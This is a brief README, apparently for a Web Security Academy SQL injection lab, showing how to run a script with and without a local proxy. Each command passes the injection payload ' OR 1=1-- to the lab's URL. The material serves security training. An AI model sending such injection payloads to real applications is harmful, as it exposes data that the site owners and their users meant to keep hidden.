# How to run script.py

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' OR 1=1--"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' OR 1=1--" -p 127.0.0.1:8080`
